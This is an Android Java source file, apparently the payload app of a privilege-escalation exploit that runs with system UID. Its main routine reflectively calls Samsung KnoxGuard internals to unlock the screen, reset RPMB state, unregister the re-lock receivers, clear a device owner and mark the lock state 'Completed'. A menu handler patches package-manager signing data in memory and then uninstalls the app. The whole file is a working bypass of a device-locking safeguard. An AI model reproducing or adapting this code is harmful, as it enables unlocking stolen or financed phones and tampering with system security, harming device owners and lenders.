package com.example.abxoverflow.droppedapk;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;
import android.util.Log;
import android.view.ContextMenu;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;

public class MainActivity extends Activity {

    private static final String TAG = "AbxDropped";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String id = "?";
        try {
            id = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();
        } catch (IOException e) {}

        // Auto-run KG disable if launched with --ei action 36
        Intent intent = getIntent();
        int action = intent.getIntExtra("action", 0);
        String result = "none";
        if (action > 0) {
            Log.e(TAG, "Running knoxguard_service transaction " + action + " as UID " + Process.myUid());
            result = callKnoxGuardService(action);
            Log.e(TAG, "Result: " + result);
        }

        StringBuilder s = new StringBuilder();
        s
                .append("BUILD v11-AUTOBOOT | UID=").append(Process.myUid())
                .append(" PID=").append(Process.myPid())
                .append("\n").append(id)
                .append("\nAction: ").append(action)
                .append(" | Result: ").append(result);

        try {
            Class<?> serviceManager = Class.forName("android.os.ServiceManager");
            for (String serviceName : ((String[]) serviceManager.getMethod("listServices").invoke(null))) {
                String serviceStr;
                try {
                    Object serviceObj = serviceManager
                            .getMethod("getService", String.class)
                            .invoke(null, serviceName);
                    if (serviceObj != null) {
                        serviceStr = serviceObj.toString();
                    } else {
                        serviceStr = "null (getService() was disallowed)";
                    }
                } catch (Throwable e) {
                    if (e instanceof InvocationTargetException) {
                        e = ((InvocationTargetException) e).getTargetException();
                    }
                    serviceStr = e.getClass().getName() + ": " + e.getMessage();
                }
                s.append("\n\n").append(serviceName).append(":\n").append(serviceStr);
            }
        } catch (Exception e) {
            s.append("\n\nFailed listing services");
        }

        ((TextView) findViewById(R.id.app_text)).setText(s.toString());
    }

    // Unwrap KgErrWrapper to see actual values
    private String unwrapKgErr(Object kgService, Object wrapper) {
        StringBuilder sb = new StringBuilder();
        try {
            // Try getIntResult on the service
            if (kgService != null) {
                try {
                    Method m = kgService.getClass().getDeclaredMethod("getIntResult",
                        wrapper.getClass());
                    m.setAccessible(true);
                    Object intResult = m.invoke(kgService, wrapper);
                    sb.append("int=").append(intResult).append(" ");
                } catch (Exception e) {
                    sb.append("getIntResult:").append(e.getMessage()).append(" ");
                }
            }
            // Dump all fields of the wrapper
            for (Field f : wrapper.getClass().getDeclaredFields()) {
                f.setAccessible(true);
                Object val = f.get(wrapper);
                sb.append(f.getName()).append("=").append(val).append(" ");
            }
        } catch (Exception e) {
            sb.append("unwrap_err:").append(e.getMessage());
        }
        return sb.toString();
    }

    // Use KnoxGuardSeService's classloader to find KnoxGuardNative (same JAR)
    private Class<?> getKGNativeClass() throws ClassNotFoundException {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Object kgService = sm.getMethod("getService", String.class).invoke(null, "knoxguard_service");
            ClassLoader cl = kgService.getClass().getClassLoader();
            return cl.loadClass("com.samsung.android.knoxguard.service.KnoxGuardNative");
        } catch (ClassNotFoundException e) {
            throw e;
        } catch (Exception e) {
            throw new ClassNotFoundException("Failed to get classloader", e);
        }
    }

    private String callKnoxGuardService(int transactionCode) {
        StringBuilder results = new StringBuilder();

        // Helper: unwrap KgErrWrapper to readable string
        // KgErrWrapper has fields we need to inspect
        Object kgService = null;
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            kgService = sm.getMethod("getService", String.class).invoke(null, "knoxguard_service");
        } catch (Exception e) {
            results.append("getService failed: ").append(e.getMessage()).append("\n");
        }

        // === STEP 1: Read current TA state ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            Method getTAState = nativeClass.getDeclaredMethod("tz_getTAState", int.class);
            getTAState.setAccessible(true);
            Object wrapper = getTAState.invoke(null, 0);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            String msg = "BEFORE: " + unwrapped;
            Log.e(TAG, msg);
            results.append(msg).append("\n");
        } catch (Exception e) {
            Log.e(TAG, "getTAState failed", e);
            results.append("getTAState: ").append(e.getMessage()).append("\n");
        }

        // === STEP 2: Call tz_unlockScreen(0) ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            Method unlock = nativeClass.getDeclaredMethod("tz_unlockScreen", int.class);
            unlock.setAccessible(true);
            Object wrapper = unlock.invoke(null, 0);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            String msg = "tz_unlockScreen: " + unwrapped;
            Log.e(TAG, msg);
            results.append(msg).append("\n");
        } catch (Exception e) {
            Log.e(TAG, "tz_unlockScreen failed", e);
            results.append("tz_unlockScreen: ").append(e.getMessage()).append("\n");
        }

        // === STEP 3: tz_userChecking(0) ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            Method checking = nativeClass.getDeclaredMethod("tz_userChecking", int.class);
            checking.setAccessible(true);
            Object wrapper = checking.invoke(null, 0);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            String msg = "tz_userChecking: " + unwrapped;
            Log.e(TAG, msg);
            results.append(msg).append("\n");
        } catch (Exception e) {
            Log.e(TAG, "tz_userChecking failed", e);
            results.append("tz_userChecking: ").append(e.getMessage()).append("\n");
        }

        // === STEP 4: Read TA state AFTER ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            Method getTAState = nativeClass.getDeclaredMethod("tz_getTAState", int.class);
            getTAState.setAccessible(true);
            Object wrapper = getTAState.invoke(null, 0);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            String msg = "AFTER: " + unwrapped;
            Log.e(TAG, msg);
            results.append(msg).append("\n");
        } catch (Exception e) {
            Log.e(TAG, "getTAState after failed", e);
            results.append("getTAState after: ").append(e.getMessage()).append("\n");
        }

        // === STEP 5: Also call service-level methods ===
        try {

            // unlockScreen on service (wraps native + extra logic)
            try {
                Method m = kgService.getClass().getDeclaredMethod("unlockScreen");
                m.setAccessible(true);
                m.invoke(kgService);
                Log.e(TAG, "unlockScreen(): OK");
                results.append("unlockScreen(): OK\n");
            } catch (Exception e) {
                results.append("unlockScreen: ").append(e.getCause() != null ? e.getCause().getMessage() : e.getMessage()).append("\n");
            }

            // unbindFromLockScreen
            try {
                Method m = kgService.getClass().getDeclaredMethod("unbindFromLockScreen");
                m.setAccessible(true);
                m.invoke(kgService);
                Log.e(TAG, "unbindFromLockScreen(): OK");
                results.append("unbindFromLockScreen(): OK\n");
            } catch (Exception e) {
                results.append("unbindFromLockScreen: ").append(e.getMessage()).append("\n");
            }

            // setRemoteLockToLockscreen(false)
            try {
                Method m = kgService.getClass().getDeclaredMethod("setRemoteLockToLockscreen", boolean.class);
                m.setAccessible(true);
                m.invoke(kgService, false);
                Log.e(TAG, "setRemoteLockToLockscreen(false): OK");
                results.append("setRemoteLock(false): OK\n");
            } catch (Exception e) {
                results.append("setRemoteLock: ").append(e.getMessage()).append("\n");
            }
        } catch (Exception e) {
            results.append("service methods: ").append(e.getMessage()).append("\n");
        }

        // === STEP 6: Unregister boot receiver to prevent re-lock ===
        try {
            // Get the mSystemReceiver field and unregister it
            Field receiverField = kgService.getClass().getDeclaredField("mSystemReceiver");
            receiverField.setAccessible(true);
            Object receiver = receiverField.get(kgService);
            if (receiver != null) {
                // Get context to unregister
                Field ctxField = kgService.getClass().getDeclaredField("mContext");
                ctxField.setAccessible(true);
                android.content.Context ctx = (android.content.Context) ctxField.get(kgService);
                ctx.unregisterReceiver((android.content.BroadcastReceiver) receiver);
                // Null out the field
                receiverField.set(kgService, null);
                Log.e(TAG, "mSystemReceiver UNREGISTERED");
                results.append("mSystemReceiver: UNREGISTERED\n");
            }
            // Also null out mServiceSystemReceiver
            Field srvReceiverField = kgService.getClass().getDeclaredField("mServiceSystemReceiver");
            srvReceiverField.setAccessible(true);
            Object srvReceiver = srvReceiverField.get(kgService);
            if (srvReceiver != null) {
                Field ctxField = kgService.getClass().getDeclaredField("mContext");
                ctxField.setAccessible(true);
                android.content.Context ctx = (android.content.Context) ctxField.get(kgService);
                ctx.unregisterReceiver((android.content.BroadcastReceiver) srvReceiver);
                srvReceiverField.set(kgService, null);
                Log.e(TAG, "mServiceSystemReceiver UNREGISTERED");
                results.append("mServiceSystemReceiver: UNREGISTERED\n");
            }
        } catch (Exception e) {
            Log.e(TAG, "Unregister receiver failed", e);
            results.append("unregister: ").append(e.getMessage()).append("\n");
        }

        // === STEP 7: Try native tz_resetRPMB ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            // Try resetRPMB with just int param
            Method reset = nativeClass.getDeclaredMethod("tz_resetRPMB", int.class, byte[].class);
            reset.setAccessible(true);
            Object wrapper = reset.invoke(null, 0, new byte[0]);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            Log.e(TAG, "tz_resetRPMB: " + unwrapped);
            results.append("tz_resetRPMB: ").append(unwrapped).append("\n");
        } catch (NoSuchMethodException e) {
            // Try without byte[] param
            try {
                Class<?> nativeClass = getKGNativeClass();
                Method reset = nativeClass.getDeclaredMethod("tz_resetRPMB", int.class);
                reset.setAccessible(true);
                Object wrapper = reset.invoke(null, 0);
                String unwrapped = unwrapKgErr(kgService, wrapper);
                Log.e(TAG, "tz_resetRPMB(int): " + unwrapped);
                results.append("tz_resetRPMB: ").append(unwrapped).append("\n");
            } catch (Exception e2) {
                Log.e(TAG, "tz_resetRPMB(int) failed", e2);
                results.append("tz_resetRPMB: ").append(e2.getMessage()).append("\n");
            }
        } catch (Exception e) {
            Log.e(TAG, "tz_resetRPMB failed", e);
            results.append("tz_resetRPMB: ").append(e.getMessage()).append("\n");
        }

        // === STEP 8: Clear Device Owner (stops it from re-disabling kgclient) ===
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Object dpmBinder = sm.getMethod("getService", String.class).invoke(null, "device_policy");
            // Get the actual DPM service impl
            Field dpmField = dpmBinder.getClass().getDeclaredField("this$0");
            dpmField.setAccessible(true);
            Object dpmService = dpmField.get(dpmBinder);
            // Call clearDeviceOwner
            Method clearDO = dpmService.getClass().getDeclaredMethod("clearDeviceOwner", String.class);
            clearDO.setAccessible(true);
            clearDO.invoke(dpmService, "com.kyin.adbenab");
            Log.e(TAG, "clearDeviceOwner: OK");
            results.append("clearDeviceOwner: OK\n");
        } catch (Exception e) {
            Log.e(TAG, "clearDeviceOwner failed", e);
            results.append("clearDeviceOwner: ").append(e.getCause() != null ? e.getCause().getMessage() : e.getMessage()).append("\n");
        }

        // === STEP 9: Re-enable kgclient ===
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Object pmBinder = sm.getMethod("getService", String.class).invoke(null, "package");
            // setApplicationEnabledSetting(String packageName, int newState, int flags, int userId, String callingPackage)
            Method setEnabled = pmBinder.getClass().getDeclaredMethod("setApplicationEnabledSetting",
                String.class, int.class, int.class, int.class, String.class);
            setEnabled.setAccessible(true);
            // COMPONENT_ENABLED_STATE_ENABLED = 1
            setEnabled.invoke(pmBinder, "com.samsung.android.kgclient", 1, 0, 0, "android");
            Log.e(TAG, "kgclient re-enabled: OK");
            results.append("kgclient enabled: OK\n");
        } catch (Exception e) {
            Log.e(TAG, "kgclient enable failed", e);
            results.append("kgclient enable: ").append(e.getCause() != null ? e.getCause().getMessage() : e.getMessage()).append("\n");
        }

        // === STEP 10: Set system property to Completed ===
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method set = sysProp.getMethod("set", String.class, String.class);
            set.invoke(null, "knox.kg.state", "Completed");
            Log.e(TAG, "SystemProperties.set knox.kg.state=Completed: OK");
            results.append("sysprop Completed: OK\n");
        } catch (Exception e) {
            results.append("sysprop: ").append(e.getMessage()).append("\n");
        }

        Log.e(TAG, "FINAL: " + results.toString());
        return results.toString();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @SuppressLint("MissingPermission")
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.uninstall) {
            try {
                // Delete <pastSigs> by directly editing PackageManagerService state within system_server
                // ServiceManager.getService("package").this$0.mSettings.mSharedUsers.get("android.uid.system").getSigningDetails().mPastSigningCertificates = null
                Object packManImplService = Class.forName("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, "package");
                Field packManImplThisField = packManImplService.getClass().getDeclaredField("this$0");
                packManImplThisField.setAccessible(true);
                Object packManService = packManImplThisField.get(packManImplService);
                Field settingsField = packManService.getClass().getDeclaredField("mSettings");
                settingsField.setAccessible(true);
                Object settings = settingsField.get(packManService);
                Field sharedUsersField = settings.getClass().getDeclaredField("mSharedUsers");
                sharedUsersField.setAccessible(true);
                Object sharedUser = ((Map) sharedUsersField.get(settings)).get("android.uid.system");
                Object signingDetails = sharedUser.getClass().getMethod("getSigningDetails").invoke(sharedUser);
                Field pastSigningCertificatesField = signingDetails.getClass().getDeclaredField("mPastSigningCertificates");
                pastSigningCertificatesField.setAccessible(true);
                pastSigningCertificatesField.set(signingDetails, null);

                // Uninstall this app (also triggers write of fixed packages.xml)
                getPackageManager().getPackageInstaller().uninstall(getPackageName(), null);
            } catch (Exception e) {
                e.printStackTrace();
                Toast.makeText(this, "Uninstall failed", Toast.LENGTH_SHORT).show();
            }
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}